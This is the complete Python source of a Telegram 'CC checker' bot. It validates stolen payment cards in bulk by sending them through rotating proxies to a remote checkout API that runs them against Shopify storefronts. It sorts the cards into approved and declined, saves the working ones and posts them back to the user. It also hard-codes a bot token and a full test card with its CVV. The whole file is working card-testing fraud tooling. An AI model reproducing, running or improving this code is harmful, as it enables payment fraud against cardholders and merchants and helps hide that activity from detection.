#!/usr/bin/env python3
"""
Telegram CC Checker Bot - Complete Version
python-telegram-bot v21.7
"""

import sys
import json
import re
import time
import random
import asyncio
import logging
import datetime
import io
import concurrent.futures
from pathlib import Path
from typing import Dict, List, Tuple, Optional, Any

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters
)
from telegram.constants import ParseMode

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== CONFIGURATION ==========
# IMPORTANT: This token MUST match what you created with BotFather
BOT_TOKEN = "7417431428:AAGPGtAOtcnQmJbOlAv_y6-sMHGC03bM52k"
OWNER_ID = 6821529235
API_BASE_URL = "http://140.99.254.73:3000/checkout"

# Bot settings
MAX_PROXIES = 20
MAX_MASS_CARDS = 5000
MAX_RETRIES = 3
REQUEST_TIMEOUT = 30

# ========== PATHS ==========
BASE_DIR = Path(__file__).parent
SITES_FILE = BASE_DIR / "sites.json"
PROXIES_FILE = BASE_DIR / "proxies.json"
STATS_FILE = BASE_DIR / "stats.json"
SCRIPTS_DIR = BASE_DIR / "scripts"

# ========== STATUS MAPPINGS ==========
status_emoji = {
    'APPROVED': '✅',
    'APPROVED_OTP': '✅',
    'DECLINED': '❌',
    'EXPIRED': '📅',
    'ERROR': '⚠️'
}

status_text = {
    'APPROVED': 'APPROVED',
    'APPROVED_OTP': 'APPROVED OTP',
    'DECLINED': 'DECLINED',
    'EXPIRED': 'EXPIRED',
    'ERROR': 'ERROR'
}

# ========== LOGGING ==========
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== GLOBAL DATA ==========
sites = []
proxies = []
stats = {
    "total_checks": 0,
    "approved": 0,
    "declined": 0,
    "expired": 0,
    "error": 0,
    "mass_checks": 0,
    "sites_count": 0,
    "proxies_count": 0
}

TEST_CC = "4263703530924474|06|2026|400"

# ========== DATA FUNCTIONS ==========
def load_data():
    """Load data from JSON files"""
    global sites, proxies, stats
    
    try:
        if SITES_FILE.exists():
            with open(SITES_FILE, 'r') as f:
                sites = json.load(f)
                if not isinstance(sites, list):
                    sites = ["https://9marks.myshopify.com"]
        else:
            sites = ["https://9marks.myshopify.com"]
    except Exception as e:
        logger.error(f"Error loading sites: {e}")
        sites = ["https://9marks.myshopify.com"]
    
    try:
        if PROXIES_FILE.exists():
            with open(PROXIES_FILE, 'r') as f:
                proxies = json.load(f)
                if not isinstance(proxies, list):
                    proxies = []
        else:
            proxies = []
    except Exception as e:
        logger.error(f"Error loading proxies: {e}")
        proxies = []
    
    try:
        if STATS_FILE.exists():
            with open(STATS_FILE, 'r') as f:
                loaded_stats = json.load(f)
                for key in stats:
                    if key in loaded_stats:
                        stats[key] = loaded_stats[key]
    except Exception as e:
        logger.error(f"Error loading stats: {e}")
    
    SCRIPTS_DIR.mkdir(exist_ok=True)

def save_data(data_type: str):
    """Save data to JSON files"""
    try:
        if data_type == "sites":
            with open(SITES_FILE, 'w') as f:
                json.dump(sites, f, indent=2)
        elif data_type == "proxies":
            with open(PROXIES_FILE, 'w') as f:
                json.dump(proxies, f, indent=2)
        elif data_type == "stats":
            with open(STATS_FILE, 'w') as f:
                json.dump(stats, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving {data_type}: {e}")

def update_stats(status: str, mass_check: bool = False):
    """Update bot statistics"""
    stats["total_checks"] += 1
    if status == 'APPROVED' or status == 'APPROVED_OTP':
        stats["approved"] += 1
    elif status == 'DECLINED':
        stats["declined"] += 1
    elif status == 'EXPIRED':
        stats["expired"] += 1
    elif status == 'ERROR':
        stats["error"] += 1
    
    if mass_check:
        stats["mass_checks"] += 1
    
    stats["sites_count"] = len(sites)
    stats["proxies_count"] = len(proxies)
    
    save_data("stats")

# ========== HELPER FUNCTIONS ==========
def extract_cc(text: str) -> Optional[str]:
    """Extract CC from various formats"""
    text = ''.join(char for char in text if ord(char) < 128)
    
    patterns = [
        r'(\d{16})[|:/.\s]+(\d{1,2})[|:/.\s]+(\d{2,4})[|:/.\s]+(\d{3,4})',
        r'(\d{15})[|:/.\s]+(\d{1,2})[|:/.\s]+(\d{2,4})[|:/.\s]+(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            groups = match.groups()
            cc = groups[0]
            mm = groups[1].zfill(2)
            yyyy = groups[2]
            
            if len(yyyy) == 2:
                yyyy = "20" + yyyy
            
            cvv = groups[3]
            return f"{cc}|{mm}|{yyyy}|{cvv}"
    
    return None

def extract_multiple_ccs(text: str) -> List[str]:
    """Extract multiple CCs from text"""
    ccs = []
    lines = text.split('\n')
    
    for line in lines:
        line = line.strip()
        if line:
            cc = extract_cc(line)
            if cc:
                ccs.append(cc)
    
    return ccs

def get_bin_info(card_number: str) -> Dict[str, str]:
    """Get BIN info from antipublic API"""
    bin_number = card_number[:6]
    try:
        response = requests.get(
            f"https://lookup.binlist.net/{bin_number}",
            headers={'Accept-Version': '3'},
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            return {
                "bank": data.get("bank", {}).get("name", "Unknown"),
                "country": data.get("country", {}).get("name", "Unknown"),
                "country_code": data.get("country", {}).get("alpha2", ""),
                "type": data.get("type", "Unknown"),
                "brand": data.get("brand", "Unknown"),
                "scheme": data.get("scheme", "Unknown")
            }
    except Exception as e:
        logger.error(f"Error fetching BIN info: {e}")
    
    return {
        "bank": "Unknown",
        "country": "Unknown",
        "country_code": "",
        "type": "Unknown",
        "brand": "Unknown",
        "scheme": "Unknown"
    }

def parse_proxy(proxy_str: str) -> Optional[Dict[str, str]]:
    """Parse proxy string into components"""
    try:
        proxy_str = proxy_str.strip()
        parts = proxy_str.split(':')
        if len(parts) != 4:
            return None
        
        host, port, username, password = parts
        
        if not port.isdigit():
            return None
        
        proxy_url = f"http://{username}:{password}@{host}:{port}"
        
        return {
            "host": host,
            "port": port,
            "username": username,
            "password": password,
            "url": proxy_url,
            "string": proxy_str
        }
    except Exception as e:
        logger.error(f"Error parsing proxy: {e}")
        return None

def get_concurrent_limit(proxy_count: int) -> int:
    """Calculate concurrent limit based on proxy count"""
    if proxy_count >= 15:
        return 15
    elif proxy_count >= 10:
        return 10
    elif proxy_count >= 5:
        return 5
    elif proxy_count >= 3:
        return 3
    elif proxy_count == 2:
        return 2
    elif proxy_count == 1:
        return 1
    return 0

def create_session_with_retries() -> requests.Session:
    """Create requests session with retry strategy"""
    session = requests.Session()
    retry_strategy = Retry(
        total=MAX_RETRIES,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

def is_valid_response(response_text: str) -> bool:
    """Check if API response is valid"""
    if not response_text or not isinstance(response_text, str):
        return False
    
    if response_text.strip() == "":
        return False
    
    invalid_responses = [
        "error",
        "proxy error",
        "timeout",
        "connection failed",
        "invalid",
        "bad gateway",
        "gateway timeout",
        "connection refused",
        "cannot connect"
    ]
    
    response_lower = response_text.lower()
    for invalid in invalid_responses:
        if invalid in response_lower:
            return False
    
    return True

def process_response(api_response: str, price: float = 0.00) -> Tuple[str, str, str]:
    """Process API response and determine status"""
    if not api_response or not isinstance(api_response, str):
        return "NO RESPONSE", "ERROR", "$0.00"
    
    if not is_valid_response(api_response):
        return "INVALID RESPONSE", "ERROR", "$0.00"
    
    response_upper = api_response.upper()
    
    if 'THANK YOU' in response_upper:
        return 'ORDER CONFIRM!', 'APPROVED', f"${price:.2f}"
    elif '3D' in response_upper:
        return 'OTP_REQUIRED', 'APPROVED_OTP', f"${price:.2f}"
    elif any(x in response_upper for x in ['EXPIRED_CARD', 'EXPIRE_CARD', 'EXPIRED']):
        return 'EXPIRE_CARD', 'EXPIRED', f"${price:.2f}"
    elif any(x in response_upper for x in ['INSUFFICIENT_FUNDS', 'INCORRECT_CVC', 'INCORRECT_ZIP']):
        return api_response, 'APPROVED_OTP', f"${price:.2f}"
    elif 'CARD_DECLINED' in response_upper:
        return 'CARD_DECLINED', 'DECLINED', f"${price:.2f}"
    elif 'INCORRECT_NUMBER' in response_upper:
        return 'INCORRECT_NUMBER', 'DECLINED', f"${price:.2f}"
    elif 'FRAUD_SUSPECTED' in response_upper:
        return 'FRAUD_SUSPECTED', 'DECLINED', f"${price:.2f}"
    elif 'INVALID_TOKEN' in response_upper:
        return 'INVALID_TOKEN', 'DECLINED', f"${price:.2f}"
    elif 'AUTHENTICATION_ERROR' in response_upper:
        return 'AUTHENTICATION_ERROR', 'DECLINED', f"${price:.2f}"
    elif 'API_ERROR_402' in response_upper:
        return 'PAYMENT REQUIRED', 'DECLINED', f"${price:.2f}"
    elif 'API_ERROR_' in response_upper:
        return 'API ERROR', 'DECLINED', f"${price:.2f}"
    else:
        if any(x in response_upper for x in ['SUCCESS', 'APPROVED', 'APPROVE', 'OK']):
            return api_response, 'APPROVED', f"${price:.2f}"
        return api_response, 'DECLINED', f"${price:.2f}"

def test_proxy_with_api(proxy_dict: Dict[str, str], site_url: str) -> Tuple[bool, str, float]:
    """Test proxy with actual API call"""
    try:
        cc = TEST_CC
        api_url = f"{API_BASE_URL}?cc={cc}&site={site_url}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        }
        
        proxy_config = {
            'http': proxy_dict['url'],
            'https': proxy_dict['url']
        }
        
        session = create_session_with_retries()
        start_time = time.time()
        
        response = session.get(
            api_url,
            headers=headers,
            proxies=proxy_config,
            timeout=REQUEST_TIMEOUT,
            verify=False
        )
        
        response_time = time.time() - start_time
        response_text = response.text.strip() if response.status_code == 200 else f"HTTP {response.status_code}"
        
        if response.status_code == 200 and is_valid_response(response_text):
            return True, response_text, response_time
        else:
            return False, response_text, response_time
        
    except requests.exceptions.ProxyError as e:
        return False, f"Proxy Error: {str(e)}", 0.0
    except requests.exceptions.ConnectTimeout as e:
        return False, f"Connection Timeout: {str(e)}", 0.0
    except requests.exceptions.ConnectionError as e:
        return False, f"Connection Error: {str(e)}", 0.0
    except Exception as e:
        return False, f"Error: {str(e)}", 0.0

def check_site(site_url: str, cc: str, proxy_dict: Dict[str, str]) -> Dict[str, Any]:
    """Main check function with proxy"""
    result = {
        "success": False,
        "response": "",
        "status": "ERROR",
        "gateway": "",
        "price": 0.00,
        "response_time": 0.0,
        "proxy_status": "❌",
        "error": ""
    }
    
    try:
        api_url = f"{API_BASE_URL}?cc={cc}&site={site_url}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive'
        }
        
        proxy_config = {
            'http': proxy_dict['url'],
            'https': proxy_dict['url']
        }
        
        session = create_session_with_retries()
        start_time = time.time()
        
        response = session.get(
            api_url,
            headers=headers,
            proxies=proxy_config,
            timeout=REQUEST_TIMEOUT,
            verify=False
        )
        
        response_time = time.time() - start_time
        
        if response.status_code == 200:
            response_text = response.text.strip()
            result["response"] = response_text
            result["response_time"] = response_time
            result["proxy_status"] = "✅"
            
            price_match = re.search(r'[\$£€](\d+\.?\d*)', site_url)
            if price_match:
                try:
                    result["price"] = float(price_match.group(1))
                except:
                    result["price"] = 0.00
            
            processed_response, status, gateway = process_response(response_text, result["price"])
            result["response"] = processed_response[:100]
            result["status"] = status
            result["gateway"] = gateway if gateway else "Unknown"
            result["success"] = True if status != "ERROR" else False
            
        else:
            result["error"] = f"HTTP {response.status_code}"
            result["response"] = f"HTTP {response.status_code}"
            
    except requests.exceptions.ProxyError:
        result["error"] = "Proxy Error"
        result["response"] = "Proxy Error"
    except requests.exceptions.ConnectTimeout:
        result["error"] = "Connection Timeout"
        result["response"] = "Timeout"
    except requests.exceptions.ConnectionError:
        result["error"] = "Connection Error"
        result["response"] = "Connection Failed"
    except Exception as e:
        result["error"] = f"Error: {str(e)}"
        result["response"] = "System Error"
    
    return result

def format_message(cc: str, result: Dict[str, Any], bin_info: Dict[str, str], 
                   proxy_str: str, response_time: float, user_name: str) -> str:
    """Format result message"""
    parts = cc.split('|')
    card_number = parts[0] if len(parts) > 0 else ""
    
    if len(card_number) == 16:
        display_cc = f"{card_number[:4]}********{card_number[12:]}"
    else:
        display_cc = card_number
    
    if len(parts) == 4:
        formatted_cc = f"{display_cc}|{parts[1]}|{parts[2][-2:] if len(parts[2]) >= 2 else parts[2]}|{parts[3]}"
    else:
        formatted_cc = cc
    
    current_time = datetime.datetime.now().strftime("%H:%M:%S")
    proxy_parts = proxy_str.split(':')
    proxy_display = f"{proxy_parts[0]}:{proxy_parts[1]}" if len(proxy_parts) >= 2 else proxy_str
    
    emoji = status_emoji.get(result["status"], "⚠️")
    status_display = status_text.get(result["status"], result["status"])
    
    country_flag = ""
    if bin_info["country_code"]:
        try:
            code = bin_info["country_code"].upper()
            if len(code) == 2:
                flag_emoji = ''.join(chr(127397 + ord(c)) for c in code)
                country_flag = f" {flag_emoji}"
        except:
            pass
    
    if not country_flag and bin_info["country"]:
        country_flag = " 🇺🇸"
    
    message = f"""
┌─────────────────
│ {emoji} {status_display}
└─────────────────

💳 <b>Card:</b> <code>{formatted_cc}</code>
⚡ <b>Gateway:</b> {result.get('gateway', 'Unknown')}
📝 <b>Response:</b> <code>{result.get('response', 'No response')}</code>
─────────────────
🏦 <b>Issuer:</b> {bin_info.get('bank', 'Unknown')}
🌍 <b>Country:</b> {bin_info.get('country', 'Unknown')}{country_flag}
🔢 <b>Type:</b> {bin_info.get('brand', 'Unknown')} ({bin_info.get('type', 'Unknown')})
─────────────────
👤 <b>User:</b> {user_name}
⏱️ <b>Time:</b> {result.get('response_time', 0.0):.2f} seconds
🌐 <b>Proxy:</b> {proxy_display} {result.get('proxy_status', '❌')}
🕒 <b>Checked:</b> {current_time}
"""
    
    return message.strip()

def format_mass_message(total_cards: int, approved_count: int, declined_count: int, 
                        site: str, proxy_count: int) -> str:
    """Format mass check results message"""
    hit_rate = (approved_count / total_cards * 100) if total_cards > 0 else 0
    concurrent_limit = get_concurrent_limit(proxy_count)
    
    message = f"""
┌─────────────────
│ 📊 MASS CHECK RESULTS
└─────────────────

<b>📁 Total Cards:</b> {total_cards}
<b>🔗 Site Used:</b> {site}
<b>🌐 Proxies Used:</b> {proxy_count}
<b>⚡ Concurrent Limit:</b> {concurrent_limit}

<b>✅ Approved:</b> {approved_count}
<b>❌ Declined:</b> {declined_count}

<b>🎯 Hit Rate:</b> {hit_rate:.1f}%
"""
    
    return message.strip()

# ========== COMMAND HANDLERS ==========
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user = update.effective_user
    user_name = user.first_name or "User"
    
    proxy_count = len(proxies)
    site_count = len(sites)
    concurrent_limit = get_concurrent_limit(proxy_count)
    
    message = f"""
┌─────────────────
│ 💳 CC CHECKER BOT
└─────────────────

<b>Welcome {user_name}!</b>

<b>📊 Current Status:</b>
• 🌐 Proxies: {proxy_count} (REQUIRED)
• 🔗 Sites: {site_count}
• ⚡ Concurrent Limit: {concurrent_limit}

<b>⚠️ IMPORTANT:</b>
You must add proxies before checking!

<b>📋 Commands:</b>
/chk CC|MM|YYYY|CVV - Check single card
/mass - Send TXT file with CCs
/addproxy host:port:user:pass - Add proxy
/listproxies - List all proxies
/addsite URL - Add site
/stats - Bot statistics
"""
    
    await update.message.reply_text(message, parse_mode=ParseMode.HTML)

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /chk command"""
    if not proxies:
        await update.message.reply_text(
            "❌ <b>NO PROXIES AVAILABLE!</b>\n\n"
            "Use: /addproxy host:port:username:password",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not sites:
        await update.message.reply_text("❌ No sites available.")
        return
    
    cc_text = None
    if context.args:
        cc_text = ' '.join(context.args)
    elif update.message.reply_to_message:
        cc_text = update.message.reply_to_message.text
    
    if not cc_text:
        await update.message.reply_text("❌ Use: /chk CC|MM|YYYY|CVV")
        return
    
    cc = extract_cc(cc_text)
    if not cc:
        await update.message.reply_text("❌ Invalid CC format.")
        return
    
    processing_msg = await update.message.reply_text("🔄 Checking card with proxy...")
    
    proxy_dict = random.choice(proxies)
    site = random.choice(sites)
    
    result = check_site(site, cc, proxy_dict)
    
    card_number = cc.split('|')[0]
    bin_info = get_bin_info(card_number)
    
    update_stats(result["status"], mass_check=False)
    
    user_name = update.effective_user.first_name or update.effective_user.username or "User"
    message = format_message(cc, result, bin_info, proxy_dict["string"], 
                            result["response_time"], user_name)
    
    await processing_msg.delete()
    await update.message.reply_text(message, parse_mode=ParseMode.HTML)

async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /mass command"""
    if not proxies:
        await update.message.reply_text(
            "❌ <b>NO PROXIES AVAILABLE!</b>\n\n"
            "Use: /addproxy host:port:username:password",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not sites:
        await update.message.reply_text("❌ No sites available.")
        return
    
    proxy_count = len(proxies)
    concurrent_limit = get_concurrent_limit(proxy_count)
    
    message = (
        "📁 <b>Please send a TXT file with CCs (max 5000).</b>\n"
        "Format: CC|MM|YYYY|CVV each on new line.\n\n"
        f"🌐 <b>Proxies Available:</b> {proxy_count}\n"
        f"⚡ <b>Concurrent Limit:</b> {concurrent_limit} cards at once"
    )
    
    await update.message.reply_text(message, parse_mode=ParseMode.HTML)

async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /addproxy command"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Proxy must be in format: host:port:username:password")
        return
    
    proxy_str = ' '.join(context.args)
    
    for proxy in proxies:
        if proxy["string"] == proxy_str:
            await update.message.reply_text("⚠️ Proxy already exists.")
            return
    
    if len(proxies) >= MAX_PROXIES:
        await update.message.reply_text(f"❌ Maximum {MAX_PROXIES} proxies allowed.")
        return
    
    proxy_dict = parse_proxy(proxy_str)
    if not proxy_dict:
        await update.message.reply_text("❌ Proxy must be in format: host:port:username:password")
        return
    
    test_msg = await update.message.reply_text("🔄 Testing proxy with API...")
    
    site = sites[0] if sites else "https://9marks.myshopify.com"
    success, response_text, response_time = test_proxy_with_api(proxy_dict, site)
    
    if success:
        proxies.append(proxy_dict)
        save_data("proxies")
        
        concurrent_limit = get_concurrent_limit(len(proxies))
        
        await test_msg.delete()
        await update.message.reply_text(
            f"✅ <b>Proxy added successfully!</b>\n\n"
            f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
            f"<b>User:</b> {proxy_dict['username']}\n"
            f"<b>Status:</b> Working ✅\n\n"
            f"📊 <b>Proxies:</b> {len(proxies)}/{MAX_PROXIES}\n"
            f"⚡ <b>Concurrent Limit:</b> {concurrent_limit} cards",
            parse_mode=ParseMode.HTML
        )
    else:
        await test_msg.delete()
        await update.message.reply_text(
            f"❌ <b>Proxy Test Failed!</b>\n\n"
            f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
            f"<b>Error:</b> {response_text}",
            parse_mode=ParseMode.HTML
        )

async def listproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /listproxies command"""
    if not proxies:
        await update.message.reply_text("❌ No proxies available.")
        return
    
    message = "🌐 <b>Available Proxies:</b>\n\n"
    
    for i, proxy in enumerate(proxies, 1):
        message += f"{i}. <code>{proxy['host']}:{proxy['port']}</code>\n"
        message += f"   👤 {proxy['username']}\n"
    
    message += f"\n📊 Total: {len(proxies)}/{MAX_PROXIES}"
    
    await update.message.reply_text(message, parse_mode=ParseMode.HTML)

async def clearproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /clearproxies command"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command.")
        return
    
    if not proxies:
        await update.message.reply_text("⚠️ No proxies to clear.")
        return
    
    count = len(proxies)
    proxies.clear()
    save_data("proxies")
    
    await update.message.reply_text(f"✅ Cleared {count} proxies.")

async def testproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /testproxy command"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Proxy must be in format: host:port:username:password")
        return
    
    proxy_str = ' '.join(context.args)
    proxy_dict = parse_proxy(proxy_str)
    
    if not proxy_dict:
        await update.message.reply_text("❌ Proxy must be in format: host:port:username:password")
        return
    
    test_msg = await update.message.reply_text("🔄 Testing proxy...")
    
    site = sites[0] if sites else "https://9marks.myshopify.com"
    success, response_text, response_time = test_proxy_with_api(proxy_dict, site)
    
    if success:
        await test_msg.delete()
        await update.message.reply_text(
            f"✅ <b>Proxy Test Successful!</b>\n\n"
            f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
            f"<b>User:</b> {proxy_dict['username']}\n"
            f"<b>Status:</b> Working ✅",
            parse_mode=ParseMode.HTML
        )
    else:
        await test_msg.delete()
        await update.message.reply_text(
            f"❌ <b>Proxy Test Failed!</b>\n\n"
            f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
            f"<b>Error:</b> {response_text}",
            parse_mode=ParseMode.HTML
        )

async def addsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /addsite command"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /addsite URL")
        return
    
    url = ' '.join(context.args).strip()
    
    if not url.startswith(('http://', 'https://')):
        await update.message.reply_text("❌ Invalid URL.")
        return
    
    if url in sites:
        await update.message.reply_text("⚠️ Site already exists.")
        return
    
    sites.append(url)
    save_data("sites")
    
    await update.message.reply_text(f"✅ Site added: {url}")

async def listsites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /listsites command"""
    if not sites:
        await update.message.reply_text("❌ No sites available.")
        return
    
    message = "🔗 <b>Available Sites:</b>\n\n"
    
    for i, site in enumerate(sites, 1):
        message += f"{i}. {site}\n"
    
    message += f"\n📊 Total: {len(sites)}"
    
    await update.message.reply_text(message, parse_mode=ParseMode.HTML)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stats command"""
    proxy_count = len(proxies)
    site_count = len(sites)
    concurrent_limit = get_concurrent_limit(proxy_count)
    
    total = stats["total_checks"]
    approved = stats["approved"]
    declined = stats["declined"]
    
    success_rate = (approved / total * 100) if total > 0 else 0
    
    message = f"""
┌─────────────────
│ 📊 BOT STATISTICS
└─────────────────

<b>🔢 Total Checks:</b> {total}
<b>✅ Approved:</b> {approved}
<b>🍳 Cooked:</b> {approved}
<b>❌ Declined:</b> {declined}

<b>📁 Mass Checks:</b> {stats["mass_checks"]}
<b>🌐 Proxies:</b> {proxy_count}/20
<b>⚡ Concurrent Limit:</b> {concurrent_limit}
<b>🔗 Sites:</b> {site_count}

<b>🎯 Success Rate:</b> {success_rate:.1f}%
"""
    
    await update.message.reply_text(message.strip(), parse_mode=ParseMode.HTML)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle TXT file upload for mass check"""
    if not proxies:
        await update.message.reply_text("❌ No proxies available.")
        return
    
    if not sites:
        await update.message.reply_text("❌ No sites available.")
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a TXT file.")
        return
    
    file = await document.get_file()
    file_content = await file.download_as_bytearray()
    
    try:
        text = file_content.decode('utf-8', errors='ignore')
        ccs = extract_multiple_ccs(text)
        
        if not ccs:
            await update.message.reply_text("❌ No valid CCs found.")
            return
        
        if len(ccs) > MAX_MASS_CARDS:
            ccs = ccs[:MAX_MASS_CARDS]
        
        total_cards = len(ccs)
        proxy_count = len(proxies)
        concurrent_limit = get_concurrent_limit(proxy_count)
        site = random.choice(sites)
        
        status_msg = await update.message.reply_text(
            f"🔄 Processing {total_cards} cards...\n\n"
            f"Checked: 0/{total_cards}\n"
            f"✅ Approved: 0\n"
            f"❌ Declined: 0\n\n"
            f"🌐 Using {proxy_count} proxies"
        )
        
        approved_cards = []
        declined_cards = []
        checked_count = 0
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrent_limit) as executor:
            futures = []
            
            for cc in ccs:
                proxy = random.choice(proxies)
                future = executor.submit(check_site, site, cc, proxy)
                futures.append((future, cc, proxy["string"]))
            
            for future, cc, proxy_str in futures:
                try:
                    result = future.result(timeout=REQUEST_TIMEOUT + 5)
                    checked_count += 1
                    
                    if result["status"] in ["APPROVED", "APPROVED_OTP"]:
                        approved_cards.append(cc)
                    else:
                        declined_cards.append(cc)
                    
                    update_stats(result["status"], mass_check=True)
                    
                    if checked_count % 10 == 0 or checked_count == total_cards:
                        await status_msg.edit_text(
                            f"🔄 Processing {total_cards} cards...\n\n"
                            f"Checked: {checked_count}/{total_cards}\n"
                            f"✅ Approved: {len(approved_cards)}\n"
                            f"❌ Declined: {len(declined_cards)}\n\n"
                            f"🌐 Using {proxy_count} proxies"
                        )
                        
                except Exception as e:
                    declined_cards.append(cc)
                    checked_count += 1
        
        if approved_cards:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = SCRIPTS_DIR / f"approved_{timestamp}.txt"
            with open(filename, 'w') as f:
                f.write('\n'.join(approved_cards))
        
        await status_msg.delete()
        
        results_message = format_mass_message(
            total_cards, len(approved_cards), len(declined_cards),
            site, proxy_count
        )
        
        await update.message.reply_text(results_message, parse_mode=ParseMode.HTML)
        
        if approved_cards:
            approved_text = "✅ APPROVED CARDS:\n\n" + "\n".join(approved_cards)
            if len(approved_text) > 4000:
                chunks = [approved_text[i:i+4000] for i in range(0, len(approved_text), 4000)]
                for chunk in chunks:
                    await update.message.reply_text(f"<code>{chunk}</code>", parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text(f"<code>{approved_text}</code>", parse_mode=ParseMode.HTML)
                
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    logger.error(f"Error: {context.error}")

# ========== MAIN FUNCTION ==========
def main():
    """Start the bot"""
    # Load data first
    load_data()
    
    print(f"🤖 Bot starting up...")
    print(f"🌐 Proxies loaded: {len(proxies)}")
    print(f"🔗 Sites loaded: {len(sites)}")
    print(f"📊 Total checks: {stats['total_checks']}")
    
    # DEBUG: Show the token being used
    print(f"🔑 Using token: {BOT_TOKEN[:10]}...")
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mass", mass_command))
    application.add_handler(CommandHandler("addproxy", addproxy_command))
    application.add_handler(CommandHandler("listproxies", listproxies_command))
    application.add_handler(CommandHandler("clearproxies", clearproxies_command))
    application.add_handler(CommandHandler("testproxy", testproxy_command))
    application.add_handler(CommandHandler("addsite", addsite_command))
    application.add_handler(CommandHandler("listsites", listsites_command))
    application.add_handler(CommandHandler("stats", stats_command))
    
    # Add document handler for TXT files
    application.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_document))
    
    # Add error handler
    application.add_error_handler(error_handler)
    
    # Start bot
    print("🚀 Bot is running...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
